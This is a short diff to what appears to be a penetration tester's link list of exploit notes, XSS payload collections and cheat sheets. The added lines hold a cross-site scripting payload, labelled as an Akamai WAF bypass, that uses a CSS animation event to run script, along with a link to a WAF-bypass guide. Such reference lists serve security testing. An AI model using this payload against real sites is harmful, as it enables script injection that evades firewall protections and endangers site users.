@@ -49,5 +49,11 @@ https://exploit-notes.hdks.org/exploit/web/method/web-login-bypass/
 # WAF-bypass-xss-payloads
 https://github.com/gprime31/WAF-bypass-xss-payloads/tree/master
 
+# Akamai WAF BYpass
+<style>@keyframes a{}b{animation:a;}</style>
+<b/onanimationstart=prompt`${document.domain}&#x60;>
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass
+
 # CheatSheets
 https://github.com/0xVIC/CheatSheets/tree/master
